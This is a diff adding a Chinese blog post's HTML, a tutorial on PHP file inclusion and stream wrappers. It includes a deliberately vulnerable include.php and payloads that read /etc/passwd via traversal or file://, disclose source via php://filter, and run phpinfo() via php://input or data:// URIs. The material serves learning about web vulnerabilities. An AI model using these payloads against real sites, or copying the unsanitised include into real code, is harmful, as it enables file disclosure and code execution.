@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>伪协议与文件包含 | Zhangzhiyang的博客</title>
+
+    
+<link href="/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+<meta name="author" content="Zhang zhiyang" />
+<meta name="description" content="不过是些许风霜罢了" />
+
+
+
+<meta name="generator" content="Hugo 0.76.3" />
+
+<link rel="canonical" href="https://www.geekyang.top/post/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" />
+
+
+<meta property="og:title" content="伪协议与文件包含" />
+<meta property="og:description" content="宠辱不惊，闲看庭前花开花落。
+去留无意，漫随天外云卷云舒。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekyang.top/post/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" />
+<meta property="og:image" content="https://www.geekyang.top/img/dawn.jpg" />
+<meta property="article:published_time" content="2019-08-13T09:39:50+00:00" />
+<meta property="article:modified_time" content="2019-08-13T09:39:50+00:00" />
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://www.geekyang.top/img/dawn.jpg"/>
+
+<meta name="twitter:title" content="伪协议与文件包含"/>
+<meta name="twitter:description" content="宠辱不惊，闲看庭前花开花落。
+去留无意，漫随天外云卷云舒。"/>
+
+
+<link rel="stylesheet" href="/css/semantic.min.css" />
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="/css/OverlayScrollbars.min.css" />
+<link rel="stylesheet" href="/css/github-markdown.css" />
+<link rel="stylesheet" href="/css/site.css" />
+
+
+<style>
+  a {
+    color: seagreen !important;
+  }
+</style>
+
+
+
+<style>
+  .inverted a {
+     color: darkseagreen !important;
+  }
+</style>
+
+
+
+<style>
+  body {
+    
+      background-color: #ccc;
+    
+    
+      background-image: url(/me/background-dark.jpg);
+    
+  }
+</style>
+
+
+    
+
+
+
+
+
+
+  </head>
+
+  <body>
+    
+<nav class="ui secondary inverted menu dream-menu">
+
+  <div class="item">
+    <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
+  </div>
+  <div class="item">
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/www.geekyang.top'"></i>
+  </div>
+  <div class="item">
+    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
+  </div>
+  
+  <div class="item">
+    <i class="large link search icon" onclick="toggleSearch()"></i>
+  </div>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui centered relaxed grid dream-grid">
+  <div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    
+    <section class="ui top attached segment cover">
+      <div class="cover-img" style="background-image: url(/img/dawn.jpg);"></div>
+    </section>
+    
+    <section class="ui attached segment">
+      <header>
+        <h1 class="ui large header">
+          伪协议与文件包含
+          <div class="sub header">
+            @
+            
+              Zhang zhiyang
+            
+
+            · 
+                Tuesday, Aug 13, 2019
+              
+
+            · 2 minute read
+
+            · Update at
+              
+                Tuesday, Aug 13, 2019
+              
+          </div>
+        </h1>
+      </header>
+
+      <article style="margin-top: 2rem;"><p>宠辱不惊，闲看庭前花开花落。<br>
+去留无意，漫随天外云卷云舒。</p>
+<h1 id="0x00-基础">0x00 基础</h1>
+<h4 id="函数filefilepathurl伪协议">函数:$file=&lt;filepath|url|伪协议&gt;</h4>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>概况</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>highlight_file</code>($file)</td>
+<td>高亮输出代码</td>
+</tr>
+<tr>
+<td><code>show_source</code>($file)</td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>file</code>($file)</td>
+<td>把整个文件读入一个数组</td>
+</tr>
+<tr>
+<td><code>file_get_contents</code>($file)</td>
+<td>把整个文件读入一个字符串</td>
+</tr>
+<tr>
+<td><code>fopen</code>($file,$mode)</td>
+<td>打开一个文件，搭配fread()和fgets()使用</td>
+</tr>
+<tr>
+<td><code>readfile</code>($file)</td>
+<td>读取并输出文件内容(不输出php代码)并返回字节数</td>
+</tr>
+<tr>
+<td><code>include</code>($file)</td>
+<td>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</td>
+</tr>
+<tr>
+<td><code>include_once</code>($file)</td>
+<td>只包含一次,其它同上</td>
+</tr>
+<tr>
+<td><code>request</code>($file)</td>
+<td>在包含的过程中如果出现错误，会直接报错并退出程序的执行</td>
+</tr>
+<tr>
+<td><code>request_once</code>($file)</td>
+<td>只包含一次,其它同上</td>
+</tr>
+</tbody>
+</table>
+<h4 id="php配置文件phpini">php配置文件:php.ini</h4>
+<ul>
+<li>
+<p>allow_url_fopen=<bool>:允许获取远程url文件信息(不能获取https协议信息)</p>
+</li>
+<li>
+<p>allow_url_include=<bool>:允许包含远程url和部分伪协议</p>
+</li>
+</ul>
+<h1 id="0x01-文件包含">0x01 文件包含</h1>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">#include.php
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#a6e22e">highlight_file</span>(<span style="color:#e6db74">&#39;include.php&#39;</span>);
+$file<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;file&#39;</span>];
+<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($file)){
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;location:include.php?file=echo.php&#39;</span>);
+}
+<span style="color:#66d9ef">else</span> 
+    <span style="color:#66d9ef">include</span>($file);
+    <span style="color:#75715e">//$post=file_get_contents($file);
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">//eval($post);
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#echo.php
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;br&gt; 123456 &lt;/br&gt;&#39;</span>;
+<span style="color:#75715e">#phpinfo.php
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">phpinfo</span>();
+</code></pre></div><ul>
+<li>本地文件包含</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">url</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=/</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">passwd</span>
+<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>)  <span style="color:#75715e">//读取重要文件
+</span></code></pre></div><ul>
+<li>远程文件包含(allow_url_fopen=1&amp;allow_url_include=1)</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">url</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">geekyang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">top</span><span style="color:#f92672">/</span><span style="color:#a6e22e">test</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;https://www.geekyang.top/test.php&#39;</span>)  <span style="color:#75715e">//运行test.php
+</span></code></pre></div><ul>
+<li>目录穿越</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">url</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=../../../</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">passwd</span>
+<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$a<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;a&#39;</span>];
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;/var/www/html/&#39;</span><span style="color:#f92672">.</span>$a); <span style="color:#75715e">//越权读取文件&lt;url&gt;?a=../../../etc/passwd
+</span></code></pre></div><h1 id="0x02-伪协议">0x02 伪协议</h1>
+<ul>
+<li><code>file://</code>(fopen=0&amp;include=0)访问本地文件系统(绝对路径)</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">url</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=///</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">passwd</span>
+<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;file:///etc/passwd&#39;</span>) <span style="color:#75715e">//读取本地文件
+</span></code></pre></div><p><code>zip://</code> (fopen=0&amp;include=0)获取压缩文件的内容并当作php运行</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">//绝对路径 压缩包格式任意
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">url</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">zip</span><span style="color:#f92672">://</span><span style="color:#a6e22e">D</span><span style="color:#f92672">:</span><span style="color:#a6e22e">\phpstudy_pro\WWW\include\phpinfo</span><span style="color:#f92672">.</span><span style="color:#a6e22e">zip</span><span style="color:#f92672">%</span><span style="color:#ae81ff">23</span><span style="color:#a6e22e">phpinfo</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>       <span style="color:#75715e">#post phpinfo()
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$a<span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;zip://D:\phpstudy_pro\WWW\include\phpinfo.zip#phpinfo.txt&#39;</span>);
+</code></pre></div><ul>
+<li><code>php://input</code>(fopen=0&amp;include=1)获取传入的post数据并运行</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">url</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">input</span>       <span style="color:#75715e">#post phpinfo()
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$a<span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;php://input&#39;</span>);
+</code></pre></div><ul>
+<li><code>php://filter</code>(fopen=0&amp;include=0)base64编码读取源代码</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">url</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">read</span><span style="color:#f92672">=</span><span style="color:#a6e22e">convert</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64</span><span style="color:#f92672">-</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resource</span><span style="color:#f92672">=</span><span style="color:#66d9ef">echo</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;php://filter/read=convert.base64-encode/resource=test.php&#39;</span>);
+</code></pre></div><ul>
+<li><code>data://</code>(fopen=1&amp;include=1)传输数据</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">data</span><span style="color:#f92672">://</span><span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">plain</span>,<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">php</span><span style="color:#f92672">&gt;</span>
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;data://text/plain,&lt;?php phpinfo();&#39;</span>);<span style="color:#75715e">//传输php代码数据并运行
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">url</span><span style="color:#f92672">&gt;?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">data</span><span style="color:#f92672">://</span><span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">plain</span>,<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">phpinfo</span>();
+
+<span style="color:#a6e22e">data</span><span style="color:#f92672">://</span><span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">plain</span>;<span style="color:#a6e22e">base64</span>,<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">base64_php</span><span style="color:#f92672">&gt;</span>
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==&#39;</span>);<span style="color:#75715e">//解码base64传输数据
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">url</span><span style="color:#f92672">&gt;?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">data</span><span style="color:#f92672">://</span><span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">plain</span>;<span style="color:#a6e22e">base64</span>,<span style="color:#a6e22e">PD9waHAgcGhwaW5mbygpOw</span><span style="color:#f92672">==</span>
+</code></pre></div></article>
+    </section>
+
+    <footer class="ui attached segment dream-tags" data-html2canvas-ignore>
+      
+        
+          <a class="ui label" href="/tags/php" title="php">php</a>
+        
+      
+      <div
+        class="ui label"
+        style="float: right; cursor: pointer;"
+        onclick="savePostAsImg()">
+        <i class="save icon"></i>Save as image
+      </div>
+    </footer>
+
+    
+      <footer class="ui attached segment" data-html2canvas-ignore>
+        <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="/img/404.jpg" /></a><br />本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。
+      </footer>
+    
+
+    
+      <footer class="ui bottom attached stacked segment post-disqus-area" data-html2canvas-ignore>
+        <div id="disqus_thread"></div>
+        <script>
+          
+
+
+          var disqus_config = function () {
+            this.page.url = 'https:\/\/www.geekyang.top\/post\/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\/';  
+            this.page.identifier = '\/post\/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\/'; 
+          };
+
+          (function() { 
+            var d = document, s = d.createElement('script');
+            s.src = 'https://' + 'g1eny0ung' + '.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+          })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+      </footer>
+    
+    
+    
+      <div class="ui segment utterances-comments" data-html2canvas-ignore>
+        <script src="https://utteranc.es/client.js"
+          repo="geekzzy/geekzzy.github.io"
+          issue-term="og:title"
+          theme="github-light"
+          crossorigin="anonymous"
+          async>
+        </script>
+      </div>
+    
+
+    
+
+  </div>
+  <div class="sixteen wide mobile sixteen wide tablet four wide computer column">
+    <article class="dream-header">
+  <section class="ui top attached center aligned segment">
+    <div class="ui small circular image">
+      
+        <img src="/img/404.jpg">
+      
+    </div>
+
+    
+    <h1 class="ui medium header">Zhang zhiyang&#39;s blog<div class="sub header" style="margin-top: 0.5rem;">不过是些许风霜罢了</div>
+    </h1>
+    
+
+    <div class="ui horizontal list">
+      
+      <a class="item" href="/tags">
+        <i class="tags icon" title="All Tags"></i>
+      </a>
+      <a class="item" href="/categories">
+        <i class="th list icon" title="All Categories"></i>
+      </a>
+    </div>
+  </section>
+
+  
+  <section class="ui attached center aligned segment dream-tags">
+    
+      <a class="ui label" href="/tags/cyber-security" title="cyber-security">cyber-security</a>
+    
+      <a class="ui label" href="/tags/english" title="english">english</a>
+    
+      <a class="ui label" href="/tags/linux" title="linux">linux</a>
+    
+      <a class="ui label" href="/tags/math" title="math">math</a>
+    
+      <a class="ui label" href="/tags/mysql" title="mysql">mysql</a>
+    
+      <a class="ui label" href="/tags/php" title="php">php</a>
+    
+      <a class="ui label" href="/tags/python" title="python">python</a>
+    
+  </section>
+  
+
+  
+  <section class="ui attached segment dream-categories">
+    <div class="ui accordion">
+      
+      
+      
+      
+      
+
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            <a href="/categories/cyber-security" class="item">cyber-security</a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/ssh-protocal/" class="item">SSh</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/msf/" class="item">Msfconsole</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/nmap-munal/" class="item">Nmap manual</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/sql-injection/" class="item">SQL_injection</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/sqlmap/" class="item">Sqlmap manual</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="item">File_upload</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            <a href="/categories/english" class="item">english</a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/" class="item">Non Predicate Verb</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/%E4%B8%BB%E8%B0%93%E4%B8%80%E8%87%B4/" class="item">Subject-Verb Concord</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            <a href="/categories/linux" class="item">linux</a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/linuxdir/" class="item">Directory</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/linux-tools/" class="item">Tools</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            <a href="/categories/math" class="item">math</a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/markdown/" class="item">markdown数学表达式</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/" class="item">不定积分</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/%E6%97%A0%E7%A9%B7%E7%BA%A7%E6%95%B0/" class="item">无穷级数</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            <a href="/categories/mysql" class="item">mysql</a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/mysql%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/" class="item">任意读写漏洞</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/mysql-bases/" class="item">Bases</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            <a href="/categories/php" class="item">php</a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a href="/post/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="item">伪协议与文件包含</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+        
+
+        
+      
+
+      
+        <div class="title">
+          <a class="item" href="/categories" style="padding-left: 0.5rem;">......</a>
+        </div>
+      
+    </div>
+  </section>
+  
+
+  <section class="ui attached segment header-socials">
+    <nav class="ui secondary menu dream-menu dream-socials">
+  
+    <div class="item">
+      <a href="/index.xml">
+        <i class=" rss square icon" title="RSS"></i>
+      </a>
+    </div>
+  
+  
+    <div class="item">
+      <a href="mailto:2940854309@qq.com">
+        <i class=" mail icon" title="Email"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://twitter.com/g1eny0ung" target="_blank">
+        <i class=" twitter icon" title="Twitter"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://facebook.com/g1eny0ung" target="_blank">
+        <i class=" facebook icon" title="Facebook"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://instagram.com/g1eny0ung" target="_blank">
+        <i class=" instagram icon" title="Instagram"></i>
+      </a>
+    </div>
+  
+
+  
+
+  
+    <div class="item">
+      <a href="https://www.linkedin.com/in/g1eny0ung" target="_blank">
+        <i class=" linkedin icon" title="Linkedin"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://github.com/g1eny0ung" target="_blank">
+        <i class=" github icon" title="GitHub"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://www.stackoverflow.com/users/5676489/g1eny0ung" target="_blank">
+        <i class=" stack overflow icon" title="StackOverflow"></i>
+      </a>
+    </div>
+  
+
+  
+</nav>
+
+  </section>
+
+  <section class="ui bottom attached center aligned segment">
+    
+      <p>© 2016 - 2021 Zhangzhiyang的博客</p>
+    
+
+    <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
+
+    
+      <p>我听别人说这世界上有一种鸟是没有脚的，它只能够一直的飞呀飞呀，飞累了就在风里面睡觉，这种鸟一辈子只能下地一次，那一次就是它死亡的时候。</p>
+    
+  </section>
+  <script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</article>
+
+  </div>
+</div>
+
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <div class="ui centered relaxed grid dream-grid dream-back">
+  
+  
+  
+    <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+      <article>
+        <div class="ui top attached segment">
+          <h3 class="ui header">日程</h3>
+        </div>
+        <div class="ui bottom attached segment markdown-body">
+          <p>Zhangzhiyang的 ❤️ 博客</p>
+
+        </div>
+      </article>
+    </section>
+  
+    <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+      <article>
+        <div class="ui top attached segment">
+          <h3 class="ui header">我的一些开源项目</h3>
+        </div>
+        <div class="ui bottom attached segment markdown-body">
+          <ul>
+<li><a href="https://github.com/ilime/Petal">Petal 🌺</a> ➡️ <a href="https://douban.fm/">豆瓣 FM</a> 桌面版</li>
+<li><a href="https://github.com/g1eny0ung/hugo-theme-dream">hugo-theme-dream 🌱</a> ➡️ <a href="https://gohugo.io">HUGO</a> 的博客主题，当然，也是你现在看到的博客主题</li>
+<li><a href="https://github.com/g1eny0ung/Alfred-Colors-workflow">Alfred-Colors-workflow</a> ➡️ Alfred 插件：CSS 颜色格式转换 hex &lt;=&gt; rgb &lt;=&gt; hsl</li>
+<li><a href="https://github.com/g1eny0ung/github-colorful-contributions-graph">github-colorful-contributions-graph</a> ➡️ 改变 GitHub 贡献面板颜色的 Chrome 插件</li>
+<li><a href="https://github.com/dayjs/day.dart">day.dart</a> ➡️ ⏰ Day.js in dart.</li>
+</ul>
+<p><a href="https://github.com/g1eny0ung">等等等等</a></p>
+
+        </div>
+      </article>
+    </section>
+  
+
+  <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article>
+      <div class="ui top attached segment">
+        <h3 class="ui header">Social Links</h3>
+      </div>
+      <div class="ui bottom attached segment">
+        <nav class="ui secondary menu dream-menu dream-socials">
+  
+    <div class="item">
+      <a href="/index.xml">
+        <i class="large rss square icon" title="RSS"></i>
+      </a>
+    </div>
+  
+  
+    <div class="item">
+      <a href="mailto:2940854309@qq.com">
+        <i class="large mail icon" title="Email"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://twitter.com/g1eny0ung" target="_blank">
+        <i class="large twitter icon" title="Twitter"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://facebook.com/g1eny0ung" target="_blank">
+        <i class="large facebook icon" title="Facebook"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://instagram.com/g1eny0ung" target="_blank">
+        <i class="large instagram icon" title="Instagram"></i>
+      </a>
+    </div>
+  
+
+  
+
+  
+    <div class="item">
+      <a href="https://www.linkedin.com/in/g1eny0ung" target="_blank">
+        <i class="large linkedin icon" title="Linkedin"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://github.com/g1eny0ung" target="_blank">
+        <i class="large github icon" title="GitHub"></i>
+      </a>
+    </div>
+  
+
+  
+    <div class="item">
+      <a href="https://www.stackoverflow.com/users/5676489/g1eny0ung" target="_blank">
+        <i class="large stack overflow icon" title="StackOverflow"></i>
+      </a>
+    </div>
+  
+
+  
+</nav>
+
+      </div>
+    </article>
+  </section>
+
+  <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+      <footer class="ui segment">
+        <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="/img/404.jpg" /></a><br />本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。
+      </footer>
+    
+  </section>
+
+  
+    
+      <section class="sixteen wide mobile eight wide tablet eight wide computer column dream-column">
+        <footer class="ui segment">
+          <div id="disqus_thread"></div>
+          <script>
+            
+
+
+            var disqus_config = function () {
+              this.page.url = 'https:\/\/www.geekyang.top\/post\/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\/';  
+              this.page.identifier = '/'; 
+            };
+
+            (function() { 
+              var d = document, s = d.createElement('script');
+              s.src = 'https://' + 'g1eny0ung' + '.disqus.com/embed.js';
+              s.setAttribute('data-timestamp', +new Date());
+              (d.head || d.body).appendChild(s);
+            })();
+          </script>
+          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </footer>
+      </section>
+    
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script>
+  window.darkNav =  true 
